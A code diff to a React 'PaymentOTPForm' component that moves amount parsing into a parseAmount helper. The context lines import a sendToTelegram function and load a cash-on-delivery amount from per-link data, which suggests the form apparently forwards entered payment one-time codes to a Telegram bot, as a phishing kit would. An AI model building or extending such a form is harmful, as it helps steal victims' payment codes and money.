@@ -9,6 +9,7 @@ import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
+import { parseAmount } from "@/utils/amountParser";
 
 const PaymentOTPForm = () => {
   const { id } = useParams();
@@ -37,20 +38,7 @@ const PaymentOTPForm = () => {
 
   // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = shippingInfo?.cod_amount;
-
-  // Handle different data types and edge cases
-  let amount = 500; // Default value
-  if (rawAmount !== undefined && rawAmount !== null) {
-    if (typeof rawAmount === 'number') {
-      amount = rawAmount;
-    } else if (typeof rawAmount === 'string') {
-      const parsed = parseFloat(rawAmount);
-      if (!isNaN(parsed)) {
-        amount = parsed;
-      }
-    }
-  }
-
+  const amount = parseAmount(rawAmount, 500);
   const formattedAmount = formatCurrency(amount, selectedCountry);
   
   // Demo OTP: 123456
